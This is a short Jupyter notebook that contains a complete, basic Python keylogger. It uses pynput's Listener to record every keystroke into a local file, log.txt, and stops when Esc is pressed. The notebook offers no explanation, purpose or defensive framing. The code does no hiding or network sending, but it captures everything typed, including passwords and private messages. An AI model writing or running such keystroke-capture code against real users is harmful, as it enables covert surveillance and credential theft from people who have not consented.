{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def press(key):\n",
    "    key_stroke = str(key).replace(\"'\",\"\")\n",
    "    with open(\"log.txt\", \"a\") as f:\n",
    "        if key_stroke == \"Key.space\":\n",
    "            f.write(\" \")\n",
    "        elif len(key_stroke) > 1:\n",
    "            f.write(\"\\n\" + key_stroke + \"\\n\")\n",
    "        else:\n",
    "            f.write(key_stroke)\n",
    "\n",
    "def release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "        \n",
    "with Listener(on_press=press, on_release=release) as listener:\n",
    "    listener.join()\n",
    "            \n",
    "            "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
